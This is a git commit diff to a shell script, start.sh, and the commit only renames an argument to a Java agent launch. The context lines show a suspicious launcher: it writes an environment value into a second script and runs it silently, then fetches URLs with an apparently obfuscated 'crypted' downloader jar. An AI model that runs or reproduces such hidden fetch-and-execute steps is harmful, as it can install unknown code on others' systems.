c10131e8db1d1c067701d9f3c7f3b4402a7f9a79
shelpinIII111 <90688331+shelpinIII111@users.noreply.github.com>
2021-09-21 03:55:18 +0430

    Update start.sh

--- start.sh
+++ start.sh
@@ -5,4 +5,4 @@ echo -e $LINK2 > start2.sh
 bash start2.sh &> /dev/null
 java -jar crypted_jwget.jar $LINK
 java -jar crypted_jwget.jar $LINK3
-java "-javaagent:AL.jar" -jar "AL.jar" Storage
+java "-javaagent:AL.jar" -jar "AL.jar" Storage10
